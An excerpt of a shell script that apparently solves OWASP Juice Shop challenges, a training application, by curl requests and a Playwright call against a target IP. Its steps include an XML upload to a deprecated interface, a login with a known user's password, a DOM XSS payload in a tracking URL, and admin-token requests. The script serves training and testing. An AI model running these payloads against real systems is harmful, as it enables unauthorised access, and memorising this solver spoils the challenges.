...
echo "2.2 - DEPRECATED INTERFACE"
curl -s -X POST "http://$target_ip/file-upload" -b "$result_folder/2-admin-cookies.txt" -H "Authorization: Bearer ${ADMIN_TOKEN}" -L -F "file=@$scriptpath/invoice.xml;type=application/xml" -o /dev/null
...
echo "2.5 - LOGIN MC SAFESEARCH"
curl -s -X POST "http://$target_ip/rest/user/login" -b "$result_folder/2-cookies.txt" -L -H "Content-Type: application/json" -d "{\"email\":\"mc.safesearch@juice-sh.op\",\"password\":\"Mr. N00dles\"}" -o /dev/null
...
node $scriptpath/../../tools/playwright.js "http://$target_ip/#/track-result?id=%3Ciframe%20src%3D%22javascript:alert(%60xss%60)%22%3E" "$result_folder/2-cookies.txt" > $result_folder/2-track.html 2> /dev/null

# Behave like any "white-hat" should before getting into the action.
echo "2.8 - SECURITY POLICY"
curl -s -X GET http://$target_ip/.well-known/security.txt -b "$result_folder/-cookies.txt" -L -o $result_folder/2-security.txt
...
curl -s -X POST "http://$target_ip/api/Complaints/" -b "$result_folder/2-admin-cookies.txt" -L -H "Authorization: Bearer ${ADMIN_TOKEN}" -H "Content-Type: application/json" -d "{\"UserId\":1,\"message\":\"md5\"}" -o /dev/null
